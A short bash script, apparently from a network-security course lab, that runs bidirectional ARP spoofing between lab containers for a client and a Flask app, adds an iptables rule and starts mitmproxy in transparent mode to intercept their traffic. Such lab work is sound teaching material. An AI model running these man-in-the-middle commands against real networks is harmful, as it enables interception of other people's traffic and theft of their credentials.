#!/usr/bin/env bash
while getopts 's:h' opt; do
  case $opt in
    s)
      podman exec cns_student /usr/bin/env arpspoof -t cns_client cns_flaskr &>/dev/null &
      podman exec cns_student /usr/bin/env arpspoof -t cns_flaskr cns_client &>/dev/null &
      podman exec cns_student /bin/bash /student/add_iptables_rule.sh
      podman exec -it cns_student /usr/bin/env mitmproxy -m transparent -s /student/proxy.py
      exit 1
      ;;
    ?|h)
      echo "Usage: $(basename $0) [-s]"
      exit 1
      ;;
  esac
done
podman exec cns_student /usr/bin/env arpspoof -t cns_client cns_flaskr &>/dev/null &
podman exec cns_student /usr/bin/env arpspoof -t cns_flaskr cns_client &>/dev/null &
podman exec cns_student /bin/bash add_iptables_rule.sh
podman exec -it cns_student /usr/bin/env mitmproxy -m transparent